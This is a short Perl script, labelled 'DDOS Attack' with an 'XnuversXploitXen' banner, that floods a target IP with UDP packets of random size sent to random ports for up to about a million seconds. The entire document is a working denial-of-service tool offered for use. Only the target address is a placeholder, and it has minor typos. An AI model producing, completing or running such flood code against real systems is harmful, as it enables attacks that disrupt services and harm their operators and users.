// DDOS Attack :D
// This PERL Program!
// XnuversXploitXen


#!/usr/bin/perl START SCRIPT
    
  print q{

};

    use Socket;
    use strict;
    
    print "
  __  __                              __  __      _       _ _  __  __          
  \ \/ /_ __  _   ___   _____ _ __ ___\ \/ /_ __ | | ___ (_) |_\ \/ /___ _ __  
   \  /| '_ \| | | \ \ / / _ \ '__/ __|\  /| '_ \| |/ _ \| | __|\  // _ \ '_ \ 
   /  \| | | | |_| |\ V /  __/ |  \__ \/  \| |_) | | (_) | | |_ /  \  __/ | | |
  /_/\_\_| |_|\__,_| \_/ \___|_|  |___/_/\_\ .__/|_|\___/|_|\__/_/\_\___|_| |_|
                                         |_|                                 

    /n";
    
    my ($ip) = "input ip target for making DDOS. eg 192.162.25.80";
    my ($port) = 0;
    my ($size) = 0;
    my ($time) = 0;
    
    my ($iaddr,$endtime,$psize,$pport);
    
    $iaddr = inet_aton("$ip") or die "Gagal Konek $ip\n";
    $endtime = time() + ($time ? $time : 1000000);
    
    socket(flood, PF_INET, SOCK_DGRAM, 17);
    
    
    print "Flooding $ip " . ($port ? $port : "random") . " port with " .
      ($size ? "$size-byte" : "random size") . " packets" .
      ($time ? " for $time seconds" : "") . "\n";
    

    for (;time() <= $endtime;) {
      $psize = $size ? $size : int(rand(1024-64)+64) ;
      $pport = $port ? $port : int(rand(65500))+1;
    
      send(flood, pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"), 0, pack_sockaddr_in($pport, $iaddr));
  
    
      print ("$ip:$pport packet size: $psize\n");
   }
